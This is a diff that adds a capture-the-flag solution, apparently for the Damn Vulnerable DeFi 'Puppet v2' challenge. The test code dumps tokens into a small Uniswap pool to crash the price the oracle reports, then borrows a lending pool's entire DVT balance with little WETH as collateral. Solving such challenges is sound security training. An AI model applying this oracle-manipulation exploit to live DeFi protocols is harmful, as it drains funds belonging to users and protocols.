@@ -83,6 +83,41 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Player has 20 ETH & 10,000 DVT
+        // Uniswap pool has 10 ETH & 1000 DVT
+        // Lending pool has 1,000,000 DVT
+
+        // Calculate expected ETH received (getAmountOut)
+        const expectedWethReceived = await uniswapRouter.getAmountOut(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            UNISWAP_INITIAL_WETH_RESERVE
+        )
+        console.log("Expected ETH received is: ", Number(expectedWethReceived) / 10 ** 18);
+
+        // Approve Router to transfer DVT on behalf of the player
+        const approval = await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // Deposit DVT Tokens into the pool to drive DVT price down
+        const actualEthReceived = await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            expectedWethReceived,
+            [token.address, weth.address], 
+            player.address, 
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 1e6},
+        )
+        console.log("Actual ETH received: ", actualEthReceived);
+
+        const wethRequired = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("WETH required: ", Number(wethRequired) / 10 ** 18);
+
+        // Approve the lending pool to transfer WETH on behalf of the player
+        await weth.connect(player).deposit({value: ethers.utils.parseEther('29.5')})
+        const approval2 = await weth.connect(player).approve(lendingPool.address, wethRequired);
+
+        // Exploit the lending pool contract
+        const exploit = await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
